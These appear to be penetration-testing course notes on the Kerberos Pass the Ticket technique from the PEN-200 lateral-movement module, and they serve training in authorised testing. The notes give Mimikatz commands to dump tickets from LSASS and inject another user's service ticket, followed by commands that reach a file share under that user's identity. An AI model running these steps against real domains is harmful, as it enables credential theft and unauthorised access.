# 24.1.5 — Pass the Ticket (PtT)

- Module: PEN-200 · 24. Lateral Movement in Active Directory
- Source: portal.offsec.com · module `lateral-movement-in-active-directory-47888` (§24.1.5)
- Code blocks: 4

> Export another user's cached **TGS** and inject it into our session to reach a resource they can
> access but we can't. **A TGS for our own user needs no admin rights**; exporting others' tickets
> from LSASS does. Output omitted.

## Confirm we lack access

```powershell
ls \\{{COMPUTER_NAME}}\backup      # Access denied as current user
```

## Export all tickets from LSASS to .kirbi files (Mimikatz, elevated)

```
privilege::debug
sekurlsa::tickets /export
```

```powershell
dir *.kirbi        # pick a target TGS, e.g. <victim>@cifs-<host>.kirbi
```

## Inject the chosen ticket and use it

```
kerberos::ptt [0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi
```

```powershell
klist                             # confirm the injected TGS is now cached
ls \\{{COMPUTER_NAME}}\backup     # now accessible as the impersonated user
```

> **TGT vs TGS:** a TGT isn't bound to a host (reusable anywhere ~10 h to request TGSs); a TGS is
> valid only for its specific service/SPN. PtT reuses the TGS directly.
